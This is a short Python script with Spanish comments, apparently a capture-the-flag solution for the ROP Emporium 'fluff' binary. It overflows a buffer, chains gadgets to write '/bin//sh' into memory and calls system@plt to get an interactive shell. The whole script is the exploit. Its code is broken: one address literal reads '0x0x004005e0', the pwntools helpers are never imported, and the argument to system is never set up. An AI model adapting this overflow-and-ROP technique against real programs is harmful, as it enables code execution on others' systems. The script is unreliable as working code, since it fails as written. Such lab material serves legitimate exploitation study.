#!/usr/bin/env python

JUNK_VALUE = "\x01\x01\x01\x01\x01\x01\x01\x01"

ovf = "A"*40

w_region = 0x601050             # Writable memory area
zero_r11 = p64(0x00400822)      # 
pop_r12 = p64(0x00400832)       # 
xor_r11 = p64(0x0040082f)       # 
xch_r10_r11 = p64(0x00400840)   # 
save_in_R10 = p64(0x0040084e)   # 
system_plt = p64(0x0x004005e0)

def set_r11(value):
    chain = zero_r11             # seteamos r11 a 0
    chain += JUNK_VALUE

    chain += pop_r12              # Configuramos r12 con la addr donde vamos a escribir en r11
    chain += p64(value)

    chain += xor_r11              # Escribimos en r11 con r11 ^= r12
    chain += JUNK_VALUE
    
    return chain


payload = ovf                   # Desbordamos
payload += set_r11(w_region)    # Seteamos el valor de r11 

payload += xch_r10_r11          # Hay que poner en r10 el valor de r11
payload += JUNK_VALUE

payload += set_r11(0x68732f2f6e69622f)  # Hay que volver a escribir en r11 ya que el exchange habra puesto 
                                      # algo que no nos interesa

payload += save_in_R10          # Guardamos en memoria
payload += JUNK_VALUE
payload += p64(0x0)

payload += system_plt

# print(payload)

e = process('./fluff')
print(e.recv())
e.sendline(payload)
e.interactive()